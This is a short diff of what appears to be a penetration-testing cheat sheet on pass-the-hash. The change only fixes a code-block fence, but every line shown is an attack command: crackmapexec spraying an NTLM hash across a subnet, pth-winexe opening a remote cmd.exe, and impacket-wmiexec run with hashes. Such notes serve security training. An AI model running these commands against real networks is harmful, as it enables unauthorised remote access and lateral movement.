@@ -23,7 +23,7 @@
 
 ```crackmapexec 10.11.0.1/24 -u <username> -H <HASH_TO_PASS>```
 
-```pth-winexe -U DOMAIN/USERNAME%HASH //target.lab cmd.exe
+```pth-winexe -U DOMAIN/USERNAME%HASH //target.lab cmd.exe```
 
 ```impacket-wmiexec -hashes :somehashhere someone@target.lab```
 
